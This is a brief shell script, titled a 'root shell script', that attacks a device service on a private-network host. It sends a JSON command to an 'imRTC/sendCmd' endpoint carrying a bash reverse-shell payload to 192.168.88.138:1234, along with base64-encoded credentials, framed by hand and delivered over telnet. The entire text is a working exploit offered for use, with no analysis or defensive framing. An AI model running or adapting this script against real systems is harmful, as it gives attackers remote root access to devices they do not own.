#!/bin/sh
# Get root shell script
# Author:	Max.Chiu

HOST=192.168.88.133
PORT=9881

CMD={"route":"imRTC/sendCmd","req_data":{"cmd":"bash -i >& /dev/tcp/192.168.88.138/1234 0<&1","auth":"bWVkaWFzZXJ2ZXI6MTIz"},"id":0}
(cat req.txt;sleep 2;echo "\x81\x7e\x00\x80$CMD\c";) | telnet $HOST $PORT 2>/dev/null